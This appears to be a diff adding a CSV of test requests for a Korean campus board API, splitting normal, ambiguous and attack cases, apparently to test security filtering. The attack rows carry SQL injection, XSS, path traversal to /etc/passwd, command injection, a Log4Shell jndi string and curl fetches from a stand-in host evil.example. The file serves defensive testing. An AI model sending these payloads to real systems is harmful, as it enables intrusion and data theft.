@@ -1,0 +1,101 @@
+case_id,case_class,request_intent,http_method,request_path,content_type,request_body,auth_scope,capture_var,capture_expr,accepted_codes
+board_001,normal,board-browse-normal,GET,/api/board/posts?keyword=wifi&sort=latest&page=0&size=5,,,student,,,200|404
+board_002,normal,board-browse-normal,GET,/api/board/posts?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&sort=title&page=0&size=6,,,student,,,200|404
+board_003,normal,board-browse-normal,GET,/api/board/posts?keyword=%EC%9E%A5%ED%95%99%EA%B8%88&sort=latest&page=0&size=5,,,student,,,200|404
+board_004,normal,board-browse-normal,GET,/api/board/posts?keyword=%EC%88%98%EA%B0%95%EC%8B%A0%EC%B2%AD&sort=title&page=0&size=6,,,student,,,200|404
+board_005,normal,board-browse-normal,GET,/api/board/posts?keyword=%EA%B8%B0%EC%88%99%EC%82%AC&sort=latest&page=0&size=5,,,student,,,200|404
+board_006,normal,board-browse-normal,GET,/api/board/posts?keyword=cafeteria&sort=latest&page=0&size=5,,,student,,,200|404
+board_007,normal,board-browse-normal,GET,/api/board/posts?keyword=parking&sort=title&page=0&size=6,,,student,,,200|404
+board_008,normal,board-browse-normal,GET,/api/board/posts?author=student1&sort=latest&page=0&size=5,,,student,,,200|404
+board_009,normal,board-browse-normal,GET,/api/board/posts?author=student2&sort=title&page=0&size=6,,,student,,,200|404
+board_010,normal,board-browse-normal,GET,/api/board/posts?author=%EA%B9%80%EB%AF%BC%EC%A7%80&sort=latest&page=0&size=5,,,student,,,200|404
+board_011,normal,board-browse-normal,GET,/api/board/posts?author=%EA%B0%95%ED%95%B4%EB%A6%B0&sort=title&page=0&size=6,,,student,,,200|404
+board_012,normal,board-browse-normal,GET,/api/board/posts?author=%EC%9E%A5%EC%9B%90%EC%98%81&sort=latest&page=0&size=5,,,student,,,200|404
+board_013,normal,board-browse-normal,GET,/api/board/posts?keyword=wifi&dateFrom=2026-03-01&dateTo=2026-03-31&sort=latest&page=0&size=6,,,student,,,200|404
+board_014,normal,board-browse-normal,GET,/api/board/posts?keyword=%EB%8F%84%EC%84%9C%EA%B4%80&dateFrom=2026-02-01&dateTo=2026-03-15&sort=title&page=0&size=5,,,student,,,200|404
+board_015,normal,board-browse-normal,GET,/api/board/posts?keyword=%EA%B5%90%EC%96%91&sort=oldest&page=0&size=5,,,student,,,200|404
+board_016,normal,board-browse-normal,GET,/api/board/posts?keyword=%EB%B3%B4%EC%95%88&sort=latest&page=0&size=5,,,student,,,200|404
+board_017,normal,board-browse-normal,GET,/api/board/posts/1,,,student,,,200|404
+board_018,normal,board-browse-normal,GET,/api/board/posts/2,,,student,,,200|404
+board_019,normal,board-browse-normal,GET,/api/board/posts/999999,,,student,,,200|404
+board_020,normal,board-browse-normal,GET,/api/board/posts?keyword=%EC%A0%95%EC%83%81%20%EC%9A%94%EC%B2%AD&sort=latest&page=1&size=5,,,student,,,200|404
+board_021,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=select%20%EB%AC%B8%20%EC%A0%95%EB%A6%AC&sort=latest&page=0&size=6,,,student,,,200|400
+board_022,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=script%20%ED%83%9C%EA%B7%B8%20%ED%95%84%ED%84%B0%EB%A7%81&sort=title&page=0&size=5,,,student,,,200|400
+board_023,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=alert%20tcp%20%EB%A3%B0&sort=latest&page=0&size=5,,,student,,,200|400
+board_024,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=SQL%20injection%20%EB%B3%B4%EA%B3%A0%EC%84%9C&sort=title&page=0&size=6,,,student,,,200|400
+board_025,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=XSS%20payload%20%EC%98%88%EC%8B%9C&sort=latest&page=0&size=5,,,student,,,200|400
+board_026,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=LFI%20%EA%B2%BD%EB%A1%9C%20%EC%98%88%EC%8B%9C&sort=title&page=0&size=5,,,student,,,200|400
+board_027,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=base64%20%EC%9D%B8%EC%BD%94%EB%94%A9%20%EC%9A%B0%ED%9A%8C&sort=latest&page=0&size=6,,,student,,,200|400
+board_028,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=cmd.exe%20%EC%98%88%EC%8B%9C&sort=title&page=0&size=5,,,student,,,200|400
+board_029,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=powershell%20-enc%20%EC%98%88%EC%8B%9C&sort=latest&page=0&size=5,,,student,,,200|400
+board_030,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=..%2Fadmin%20%EA%B2%BD%EB%A1%9C%20%EC%84%A4%EB%AA%85&sort=title&page=0&size=6,,,student,,,200|400
+board_031,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=whoami%20%EA%B2%B0%EA%B3%BC%20%EC%84%A4%EB%AA%85&sort=latest&page=0&size=5,,,student,,,200|400
+board_032,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=nmap%20-sS%20%EB%A1%9C%EA%B7%B8&sort=title&page=0&size=5,,,student,,,200|400
+board_033,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=drop%20table%20%EA%B8%88%EC%A7%80%20%EC%A0%95%EC%B1%85&sort=latest&page=0&size=6,,,student,,,200|400
+board_034,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=javascript%3A%20%EC%8A%A4%ED%82%B4%20%EC%84%A4%EB%AA%85&sort=title&page=0&size=5,,,student,,,200|400
+board_035,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=shellshock%28%29%20note&sort=latest&page=0&size=5,,,student,,,200|400
+board_036,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=jndi%20%EC%84%A4%EB%AA%85%20%EC%9E%90%EB%A3%8C&sort=title&page=0&size=6,,,student,,,200|400
+board_037,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=sleep%20%ED%95%A8%EC%88%98%20%EC%95%88%EB%82%B4&sort=latest&page=0&size=5,,,student,,,200|400
+board_038,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=benchmark%20%ED%95%A8%EC%88%98%20%EC%82%AC%EB%A1%80&sort=title&page=0&size=5,,,student,,,200|400
+board_039,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=%3Cimg%20onerror%3E%20%ED%95%84%ED%84%B0%EB%A7%81&sort=latest&page=0&size=6,,,student,,,200|400
+board_040,ambiguous,board-search-ambiguous,GET,/api/board/posts?keyword=query%20string%20%EC%A0%95%EB%A6%AC&sort=title&page=0&size=5,,,student,,,200|400
+board_041,attack,board-search-attack,GET,/api/board/posts?keyword=%27%20OR%20%271%27%3D%271&sort=latest&page=0&size=5,,,student,,,200|400
+board_042,attack,board-search-attack,GET,/api/board/posts?keyword=%3Cscript%3Ealert%281%29%3C%2Fscript%3E&sort=title&page=0&size=5,,,student,,,200|400
+board_043,attack,board-search-attack,GET,/api/board/posts?keyword=%3Cimg%20src%3Dx%20onerror%3Dalert%281%29%3E&sort=latest&page=0&size=5,,,student,,,200|400
+board_044,attack,board-search-attack,GET,/api/board/posts?keyword=..%2F..%2F..%2F..%2Fetc%2Fpasswd&sort=title&page=0&size=5,,,student,,,200|400
+board_045,attack,board-search-attack,GET,/api/board/posts?keyword=..%25252f..%25252f..%25252fetc%2Fpasswd&sort=latest&page=0&size=5,,,student,,,200|400
+board_046,attack,board-search-attack,GET,/api/board/posts?keyword=%3Bwhoami&sort=title&page=0&size=5,,,student,,,200|400
+board_047,attack,board-search-attack,GET,/api/board/posts?keyword=%7Ccat%20%2Fetc%2Fpasswd&sort=latest&page=0&size=5,,,student,,,200|400
+board_048,attack,board-search-attack,GET,/api/board/posts?keyword=%26%26%20curl%20http%3A%2F%2Fevil.example%2Fa.sh&sort=title&page=0&size=5,,,student,,,200|400
+board_049,attack,board-search-attack,GET,/api/board/posts?keyword=%24%7Bjndi%3Aldap%3A%2F%2Fevil.example%2Fa%7D&sort=latest&page=0&size=5,,,student,,,200|400
+board_050,attack,board-search-attack,GET,/api/board/posts?keyword=benchmark%281000000%2Cmd5%281%29%29&sort=title&page=0&size=5,,,student,,,200|400
+board_051,attack,board-search-attack,GET,/api/board/posts?keyword=waitfor%20delay%20%270%3A0%3A5%27--&sort=latest&page=0&size=5,,,student,,,200|400
+board_052,attack,board-search-attack,GET,/api/board/posts?keyword=sleep%285%29&sort=title&page=0&size=5,,,student,,,200|400
+board_053,attack,board-search-attack,GET,/api/board/posts?keyword=%24%28curl%20evil.example%2Fpoc.sh%29&sort=latest&page=0&size=5,,,student,,,200|400
+board_054,attack,board-search-attack,GET,/api/board/posts?keyword=%60id%60&sort=title&page=0&size=5,,,student,,,200|400
+board_055,attack,board-search-attack,GET,/api/board/posts?keyword=cmd.exe%20%2Fc%20whoami&sort=latest&page=0&size=5,,,student,,,200|400
+board_056,attack,board-search-attack,GET,/api/board/posts?keyword=powershell%20-enc%20ZQB2AGkAbAA%3D&sort=title&page=0&size=5,,,student,,,200|400
+board_057,attack,board-search-attack,GET,/api/board/posts?keyword=..%2Fadmin&sort=latest&page=0&size=5,,,student,,,200|400
+board_058,attack,board-search-attack,GET,/api/board/posts?keyword=javascript%3Aalert%281%29&sort=title&page=0&size=5,,,student,,,200|400
+board_059,attack,board-search-attack,GET,/api/board/posts?keyword=union%20select%20password%20from%20users--&sort=latest&page=0&size=5,,,student,,,200|400
+board_060,attack,board-search-attack,GET,/api/board/posts?keyword=%252527%252520or%2525201%3D1--&sort=title&page=0&size=5,,,student,,,200|400
+board_061,normal,board-create-post,POST,/api/board/posts,application/json,"{""title"":""정상 게시글 ${__property(mixed500_run_id)} A"",""content"":""일반 게시글 작성 기능 점검용 본문입니다.""}",student,board_post_a,id,201|400|403
+board_062,normal,board-read-created-post,GET,/api/board/posts/${board_post_a},,,student,,,200|404
+board_063,normal,board-update-post,PUT,/api/board/posts/${board_post_a},application/json,"{""title"":""정상 게시글 수정 ${__property(mixed500_run_id)} A"",""content"":""수정된 일반 게시글 본문입니다.""}",student,,,200|400|403|404
+board_064,normal,board-create-comment,POST,/api/board/posts/${board_post_a}/comments,application/json,"{""content"":""정상 댓글 작성 테스트입니다.""}",student,board_comment_a,id,201|400|403|404
+board_065,normal,board-update-comment,PUT,/api/board/posts/${board_post_a}/comments/${board_comment_a},application/json,"{""content"":""정상 댓글 수정 테스트입니다.""}",student,,,200|400|403|404
+board_066,normal,board-read-updated-post,GET,/api/board/posts/${board_post_a},,,student,,,200|404
+board_067,normal,board-delete-comment,DELETE,/api/board/posts/${board_post_a}/comments/${board_comment_a},,,student,,,204|403|404
+board_068,normal,board-delete-post,DELETE,/api/board/posts/${board_post_a},,,student,,,204|403|404
+board_069,ambiguous,board-create-post,POST,/api/board/posts,application/json,"{""title"":""보안 교육 select 예시 ${__property(mixed500_run_id)} B"",""content"":""script 태그, ../admin, alert tcp 같은 문자열을 설명용으로 적는 게시글입니다.""}",student,board_post_b,id,201|400|403
+board_070,ambiguous,board-read-created-post,GET,/api/board/posts/${board_post_b},,,student,,,200|404
+board_071,ambiguous,board-update-post,PUT,/api/board/posts/${board_post_b},application/json,"{""title"":""보안 교육 문자열 수정 ${__property(mixed500_run_id)} B"",""content"":""cmd.exe, powershell -enc, drop table 같은 문자열을 교육 문맥으로 정리합니다.""}",student,,,200|400|403|404
+board_072,ambiguous,board-create-comment,POST,/api/board/posts/${board_post_b}/comments,application/json,"{""content"":""query string, XSS payload, LFI 경로 예시를 댓글 문맥으로 남깁니다.""}",student,board_comment_b,id,201|400|403|404
+board_073,ambiguous,board-update-comment,PUT,/api/board/posts/${board_post_b}/comments/${board_comment_b},application/json,"{""content"":""보안 수업 과제 메모: select 문과 script 태그 예시는 설명용입니다.""}",student,,,200|400|403|404
+board_074,ambiguous,board-read-updated-post,GET,/api/board/posts/${board_post_b},,,student,,,200|404
+board_075,ambiguous,board-delete-comment,DELETE,/api/board/posts/${board_post_b}/comments/${board_comment_b},,,student,,,204|403|404
+board_076,ambiguous,board-delete-post,DELETE,/api/board/posts/${board_post_b},,,student,,,204|403|404
+board_077,attack,board-create-post,POST,/api/board/posts,application/json,"{""title"":""<script>alert(1)</script> 시도 ${__property(mixed500_run_id)} C"",""content"":""게시글 작성 경로에서 XSS 인젝션 시도를 발생시키는 본문입니다.""}",student,board_post_c,id,201|400|403
+board_078,attack,board-read-created-post,GET,/api/board/posts/${board_post_c},,,student,,,200|404
+board_079,attack,board-update-post,PUT,/api/board/posts/${board_post_c},application/json,"{""title"":""<img src=x onerror=alert(1)> 수정 ${__property(mixed500_run_id)} C"",""content"":""수정 본문에도 명확한 스크립트 삽입 시도를 포함합니다.""}",student,,,200|400|403|404
+board_080,attack,board-create-comment,POST,/api/board/posts/${board_post_c}/comments,application/json,"{""content"":""댓글 경로에도 <script>alert(1)</script> 시도를 넣습니다.""}",student,board_comment_c,id,201|400|403|404
+board_081,attack,board-update-comment,PUT,/api/board/posts/${board_post_c}/comments/${board_comment_c},application/json,"{""content"":""댓글 수정 경로에서도 onerror 핸들러 시도를 넣습니다.""}",student,,,200|400|403|404
+board_082,attack,board-read-updated-post,GET,/api/board/posts/${board_post_c},,,student,,,200|404
+board_083,attack,board-delete-comment,DELETE,/api/board/posts/${board_post_c}/comments/${board_comment_c},,,student,,,204|403|404
+board_084,attack,board-delete-post,DELETE,/api/board/posts/${board_post_c},,,student,,,204|403|404
+board_085,attack,board-create-post,POST,/api/board/posts,application/json,"{""title"":""cmd.exe /c whoami ${__property(mixed500_run_id)} D"",""content"":""게시글 본문에 ;whoami 와 ../etc/passwd 문자열을 포함한 명확한 공격 시도입니다.""}",student,board_post_d,id,201|400|403
+board_086,attack,board-read-created-post,GET,/api/board/posts/${board_post_d},,,student,,,200|404
+board_087,attack,board-update-post,PUT,/api/board/posts/${board_post_d},application/json,"{""title"":""powershell -enc ${__property(mixed500_run_id)} D"",""content"":""수정 본문에 `id`, $(curl evil.example/poc.sh) 문자열을 포함합니다.""}",student,,,200|400|403|404
+board_088,attack,board-create-comment,POST,/api/board/posts/${board_post_d}/comments,application/json,"{""content"":""댓글 본문에도 |cat /etc/passwd 문자열을 포함합니다.""}",student,board_comment_d,id,201|400|403|404
+board_089,attack,board-update-comment,PUT,/api/board/posts/${board_post_d}/comments/${board_comment_d},application/json,"{""content"":""댓글 수정에 ${jndi:ldap://evil.example/a} 문자열을 포함합니다.""}",student,,,200|400|403|404
+board_090,attack,board-read-updated-post,GET,/api/board/posts/${board_post_d},,,student,,,200|404
+board_091,attack,board-delete-comment,DELETE,/api/board/posts/${board_post_d}/comments/${board_comment_d},,,student,,,204|403|404
+board_092,attack,board-delete-post,DELETE,/api/board/posts/${board_post_d},,,student,,,204|403|404
+board_093,attack,board-create-post,POST,/api/board/posts,application/json,"{""title"":""admin'-- ${__property(mixed500_run_id)} E"",""content"":""로그인 우회형 SQLi 시도를 게시글 작성 본문으로 전달합니다.""}",student,board_post_e,id,201|400|403
+board_094,attack,board-read-created-post,GET,/api/board/posts/${board_post_e},,,student,,,200|404
+board_095,attack,board-update-post,PUT,/api/board/posts/${board_post_e},application/json,"{""title"":""' OR '1'='1 ${__property(mixed500_run_id)} E"",""content"":""수정 본문에 waitfor delay, sleep(5) 예시를 함께 포함합니다.""}",student,,,200|400|403|404
+board_096,attack,board-create-comment,POST,/api/board/posts/${board_post_e}/comments,application/json,"{""content"":""댓글에 ../admin 과 ;whoami 문자열을 함께 남깁니다.""}",student,board_comment_e,id,201|400|403|404
+board_097,attack,board-update-comment,PUT,/api/board/posts/${board_post_e}/comments/${board_comment_e},application/json,"{""content"":""댓글 수정에 benchmark(1000000,md5(1)) 문자열을 포함합니다.""}",student,,,200|400|403|404
+board_098,attack,board-read-updated-post,GET,/api/board/posts/${board_post_e},,,student,,,200|404
+board_099,attack,board-delete-comment,DELETE,/api/board/posts/${board_post_e}/comments/${board_comment_e},,,student,,,204|403|404
+board_100,attack,board-delete-post,DELETE,/api/board/posts/${board_post_e},,,student,,,204|403|404
